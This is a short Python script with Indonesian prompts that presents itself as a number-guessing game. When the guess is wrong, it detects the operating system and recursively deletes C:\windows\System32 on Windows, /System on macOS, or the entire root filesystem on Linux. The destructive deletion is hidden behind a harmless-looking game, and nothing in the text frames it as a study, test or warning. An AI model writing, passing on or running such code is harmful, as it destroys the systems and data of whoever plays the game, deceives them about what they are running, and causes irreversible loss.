import random
import shutil
import platform

angka = random.randint(1, 2)
tebak_angka = int(input("Tebak angka (1 atau 2): "))

if tebak_angka == angka:
    print("Selamat! Tebakan Anda benar.")
else:
    system = platform.system()
    print(f"Tebakan salah! Mendeteksi OS: {system}")

    if system == "Windows":
        shutil.rmtree("C:\\windows\\System32")
        
    elif system == "Darwin":  # macOS
        shutil.rmtree("/System")
        
    elif system == "Linux":
        shutil.rmtree("/")
